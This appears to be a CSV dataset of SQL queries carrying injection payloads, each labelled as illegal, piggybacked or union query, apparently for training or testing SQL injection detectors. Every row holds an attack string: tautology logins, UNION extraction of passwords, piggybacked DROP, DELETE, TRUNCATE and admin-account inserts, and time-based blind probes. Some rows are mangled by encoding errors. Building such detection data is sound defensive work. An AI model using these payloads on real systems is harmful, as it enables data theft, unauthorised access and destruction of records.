SQL Query,Illegal/Logically Incorrect Query,PiggyBacked Query,Union Query
SELECT * from table where username = ' a' or 1=1--' and password = '',1,0,0
"SELECT user_name,password from test.members where user_name= ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--'",1,1,0
SELECT * from table where username = ' ' OR 1=1-- ' and password = '',1,0,0
SELECT * from username where type = ' a' or 1=1--',1,0,0
SELECT * from table where username = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1' and password = '',1,0,0
"SELECT * FROM students WHERE username = '""""' AND password = ''",1,0,0
SELECT * from test.members where user_name=''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
"SELECT 1,2, 'ddd"" FROM some_table WHERE ex = ample",1,0,0
"SELECT * FROM newsletter WHERE email = 'ddd' union select username,password from students --'",1,0,1
SELECT * FROM custTable WHERE User=' 1' AND non_existant_table = '1 ' OR 1=1'-- AND Pass=?,1,0,0
SELECT * FROM users WHERE username = ' ' or 'a'='a',1,0,0
"SELECT 1,2, ' 1 OR 1=1-- FROM some_table WHERE ex = ample",1,0,0
SELECT * from username where type = ' ' 1 OR 1=1-- ',1,0,0
"SELECT * from user where id =' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
SELECT * FROM some_table WHERE double_quotes = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
SELECT * from table where username = ' ' or 'x'='x' and password = '',1,0,0
SELECT email from users where email = ' ' 1 OR 1=1-- ',1,0,0
SELECT * from test.members where user_name=' ' or 'x'='x' and password='';,1,1,0
"SELECT * FROM some_table WHERE double_quotes = '""""'",1,0,0
SELECT id FROM Users WHERE username = ' ' or 1 EXEC XP_ ',1,0,0
"SELECT user_name,password from test.members where user_name= ' ' or 'a'='a'",1,0,0
SELECT * FROM users WHERE username = ''; DROP table Username --',1,1,0
SELECT * FROM custTable WHERE User=' \\'; DESC users; -- ' OR 1=1'-- AND Pass=?,1,1,0
"SELECT 1,2, '%31%27%20%4F%52%20%27%31%27%3D%27%31 FROM some_table WHERE ex = ample",0,0,0
SELECT * FROM custTable WHERE User='ddd' compute sum(username)--' OR 1=1'-- AND Pass=?,1,0,0
"SELECT * FROM some_table WHERE double_quotes = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
SELECT * FROM some_table WHERE double_quotes = ' hi' or 1=1 --',1,0,0
SELECT * FROM profiles WHERE ID = ' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
SELECT data FROM table WHERE Emailinput = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
SELECT * FROM custTable WHERE User=' ' or 1 UNION SELECT ALL FROM WHERE--' OR 1=1'-- AND Pass=?,1,0,1
"SELECT * FROM users WHERE username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
"SELECT * from test.members where user_name='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
SELECT * from username where type = ' a' waitfor delay '0:0:10'--',1,0,0
"SELECT user_name,password from test.members where user_name= 'ddd' union select username from students --'",1,0,1
SELECT * FROM newsletter WHERE email = ' hi' or 1=1 --',1,0,0
"SELECT * FROM customers WHERE username = ''union select all 1,2,x,x,x,x --' and password = ''",1,0,1
"SELECT * FROM product WHERE PCategory=''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --'",1,1,0
"SELECT data FROM table WHERE Emailinput = ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
"SELECT user_name,password from test.members where user_name= ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
SELECT data FROM table WHERE Emailinput = ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
"SELECT * from table where username = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- ' and password = ''",1,0,1
SELECT * FROM customers WHERE username = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ' and password = '',1,1,0
SELECT * FROM product WHERE PCategory=' 'sqlvuln',1,0,0
SELECT * from test.members where user_name=' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
"SELECT user_name,password from test.members where user_name= ' 1 AND USER_NAME() = \'dbo\'-- '",1,0,0
SELECT * FROM newsletter WHERE email = ' 1 AND USER_NAME() = \'dbo\'-- ',1,0,0
"SELECT * FROM product WHERE PCategory=' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
SELECT * from table where username = ' 1 AND USER_NAME() = \'dbo\'-- ' and password = '',1,0,0
SELECT id FROM Users WHERE username = '' union select password from users where name = 'Robin' --',1,0,1
"SELECT data FROM table WHERE Emailinput = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
"SELECT * FROM 'news' WHERE 'id' = ' ' 1 AND 1=1-- ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
SELECT * FROM users WHERE username = ' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
SELECT data FROM table WHERE Emailinput = ' ' or 1=1--',1,0,0
"SELECT * FROM 'news' WHERE 'id' = 'ddd' union select username,password from students --' ORDER BY 'id' DESC LIMIT 0,3",1,0,1
SELECT * FROM newsletter WHERE email = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
SELECT * from username where type = ' 1\\'1-- ',1,0,0
SELECT * FROM users WHERE username = ' admin'-- ',1,0,0
SELECT id FROM Users WHERE username = ' ' or a=a--',1,0,0
SELECT * from test.members where user_name=' a' or 1=1--',1,0,0
"SELECT * FROM 'news' WHERE 'id' = ' ' OR username IS NOT NULL OR username = ' ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
SELECT * from test.members where user_name='' union select password from users --',1,0,1
SELECT * from table where username = '' union select password from users where name = 'Robin' --' and password = '',1,0,1
SELECT * FROM users WHERE username = ' ' or 1=1--',1,0,0
SELECT email from users where email = ' 1 AND USER_NAME() = \'dbo\'-- ',1,0,0
SELECT * from username where type = 'ddd' compute sum(username)--',1,0,0
"SELECT * FROM students WHERE username = ''ddd""""' AND password = ''",1,0,0
SELECT email from users where email = 'ddd' group by (password)--',1,0,0
SELECT * FROM students WHERE username = ' ' or 0=0 #' AND password = '',1,0,0
SELECT * from test.members where user_name='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
"SELECT * from user where id ='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
SELECT data FROM table WHERE Emailinput = ' ' or 1 EXEC XP_ ',1,0,0
"SELECT * from username where type = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
SELECT * from user where id =' ' or 1=1--',1,0,0
SELECT * from user where id ='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
SELECT * FROM users WHERE username = ''or 1=1; DELETE FROM Grades WHERE course='attacker class' AND studentId=attacker studentid;--',1,1,0
"SELECT * FROM students WHERE username = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' AND password = ''",1,0,1
"SELECT user_name,password from test.members where user_name= '''",1,0,0
SELECT data FROM table WHERE Emailinput = '' union select password from users where name = 'Robin' --',1,0,1
SELECT * from username where type = ' 'sqlvuln',1,0,0
SELECT * FROM students WHERE username = ' ' or 1 UNION SELECT ALL FROM WHERE--' AND password = '',1,0,1
"SELECT * FROM profiles WHERE ID = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
"SELECT data FROM table WHERE Emailinput = 'ddd' union select username,password from students --'",1,0,1
"SELECT * from table where username = '""""' and password = ''",1,0,0
SELECT * FROM customers WHERE username = ' ' or 1 EXEC XP_ ' and password = '',1,0,0
SELECT * FROM users WHERE name=''' and password='',1,0,0
"SELECT * FROM profiles WHERE ID = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
"SELECT * FROM customers WHERE username = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--' and password = ''",1,1,0
"SELECT 1,2, 'union select all 1,2,x,x,x,x -- FROM some_table WHERE ex = ample",1,0,1
SELECT * FROM users WHERE username = ' 1' AND non_existant_table = '1 ',0,0,0
"SELECT * from table where username = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' and password = ''",1,0,1
"SELECT * from table where username = 'ddd' union select username,password from students --' and password = ''",1,0,1
SELECT * from username where type = ' ' 1 AND 1=1-- ',1,0,0
SELECT * from test.members where user_name=' 'sqlvuln',1,0,0
SELECT * FROM users WHERE name=' ' 1 AND 1=1-- ' and password='',1,0,0
SELECT * FROM profiles WHERE ID = ' 1\\'1-- ',1,0,0
"SELECT * from test.members where user_name=' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- ' and password='';",1,1,1
"SELECT 1,2, ' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1 FROM some_table WHERE ex = ample",0,0,0
"SELECT * from user where id =' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
SELECT data FROM table WHERE Emailinput = ' hi' or 1=1 --',1,0,0
"SELECT 1,2, a' or 1=1-- FROM some_table WHERE ex = ample",1,0,0
SELECT data FROM table WHERE Emailinput = '' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1',1,0,0
SELECT * FROM users WHERE username = ''',1,0,0
SELECT email from users where email = ' ' or 0=0 --',1,0,0
SELECT data FROM table WHERE Emailinput = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
SELECT * FROM profiles WHERE ID = ' ' or 1 UNION SELECT ALL FROM WHERE--',1,0,1
"SELECT id FROM Users WHERE username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/'",1,0,0
"SELECT 1,2, hi' or 1=1 -- FROM some_table WHERE ex = ample",1,0,0
SELECT data FROM table WHERE Emailinput = ' ' or 'a'='a',1,0,0
"SELECT * FROM 'news' WHERE 'id' = ' '' ' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
"SELECT * from test.members where user_name=''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --'",1,1,0
SELECT * from test.members where user_name=' hi' or 1=1 --' and password='';,1,1,0
"SELECT 1,2, ddd' group by (studentid)-- FROM some_table WHERE ex = ample",1,0,0
SELECT data FROM table WHERE Emailinput = ' ' or 0=0 --',1,0,0
SELECT * FROM product WHERE PCategory=' 1' AND 1=(SELECT COUNT(*) FROM tablenames); -- ',1,1,0
SELECT * FROM users WHERE name=' \\'; DESC users; -- ' and password='',1,1,0
SELECT * FROM custTable WHERE User=' hi' or 1=1 --' OR 1=1'-- AND Pass=?,1,0,0
SELECT * from username where type = ' ' or 1 EXEC XP_ ',1,0,0
"SELECT * FROM newsletter WHERE email = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
"SELECT 1,2, 'or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;-- FROM some_table WHERE ex = ample",1,1,0
"SELECT id FROM Users WHERE username = ''union select 1,2,3,x,x,x,x,@@version,x--'",1,0,1
SELECT * from test.members where user_name=' ' or 'a'='a' and password='';,1,1,0
"SELECT * from test.members where user_name='IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
SELECT * FROM students WHERE username = ' ' 1 AND 1=1-- ' AND password = '',1,0,0
SELECT * FROM profiles WHERE ID = ' a' or 1=1--',1,0,0
"SELECT id FROM Users WHERE username = ''ddd""""'",1,0,0
"SELECT email from users where email = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
SELECT * from test.members where user_name=' ' or 0=0 --',1,0,0
SELECT * FROM profiles WHERE ID = ' ' or 0=0 #',1,0,0
SELECT * FROM profiles WHERE ID = ' 'sqlvuln',1,0,0
SELECT * from table where username = 'ddd' union select username from students --' and password = '',1,0,1
SELECT * FROM users WHERE name='ddd' union select username from students --' and password='',1,0,1
SELECT * FROM students WHERE username = ' ' 1 OR 1=1-- ' AND password = '',1,0,0
"SELECT * FROM product WHERE PCategory=''ddd""""'",1,0,0
SELECT * from table where username = ' ' or 0=0 --' and password = '',1,0,0
SELECT * from test.members where user_name=' ' or 1 EXEC XP_ ' and password='';,1,1,0
SELECT data FROM table WHERE Emailinput = ' 1\\'1-- ',1,0,0
SELECT * from test.members where user_name=' ' OR 1=1-- ',1,0,0
SELECT * from test.members where user_name=' hi' or 1=1 --',1,0,0
"SELECT email from users where email = '""""'",1,0,0
SELECT * from test.members where user_name=' 'sqlvuln' and password='';,1,1,0
SELECT * from username where type = ' admin'-- ',1,0,0
SELECT * FROM custTable WHERE User='' union select password from users where name = 'Robin' --' OR 1=1'-- AND Pass=?,1,0,1
"SELECT * FROM users WHERE name='' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --' and password=''",1,0,1
SELECT * from user where id =' 1\\'1-- ',1,0,0
SELECT id FROM Users WHERE username = ' ' or 1=1--',1,0,0
SELECT * FROM some_table WHERE double_quotes = ' ' or 1 EXEC XP_ ',1,0,0
SELECT * from username where type = ' '' ',1,0,0
"SELECT * FROM users WHERE name=' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- ' and password=''",1,0,0
"SELECT * FROM custTable WHERE User=''union select all 1,2,x,x,x,x --' OR 1=1'-- AND Pass=?",1,0,1
SELECT * FROM students WHERE username = ' 1\\'1-- ' AND password = '',1,0,0
"SELECT 1,2, 'union select 1,2,3,x,x,x,x,@@version,x-- FROM some_table WHERE ex = ample",1,0,1
SELECT * FROM profiles WHERE ID = ' \\'; DESC users; -- ',1,1,0
SELECT id FROM Users WHERE username = ''; TRUNCATE TABLE Username; --',1,1,0
"SELECT user_name,password from test.members where user_name= '' union select password from users --'",1,0,1
SELECT * FROM customers WHERE username = ' ' 1 AND 1=1-- ' and password = '',1,0,0
SELECT * from test.members where user_name='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1' and password='';,1,1,0
"SELECT * from username where type = '""""'",1,0,0
"SELECT * FROM customers WHERE username = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- ' and password = ''",1,0,1
SELECT data FROM table WHERE Emailinput = ''; DROP table Username --',1,1,0
SELECT * FROM product WHERE PCategory='' union select password from users where name = 'Robin' --',1,0,1
SELECT * FROM custTable WHERE User='ddd' union select username from students --' OR 1=1'-- AND Pass=?,1,0,1
SELECT * from test.members where user_name=' 1\\'1-- ',1,0,0
"SELECT user_name,password from test.members where user_name= 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),โ€SLEEP(1)))OR""*/'",1,0,0
"SELECT * FROM profiles WHERE ID = '' AND 1=0 UNION SELECT '1', 'a', 'Robin', 'b' --'",1,0,1
"SELECT email from users where email = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
SELECT * FROM newsletter WHERE email = ' ' or 1 EXEC XP_ ',1,0,0
"SELECT * FROM 'news' WHERE 'id' = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
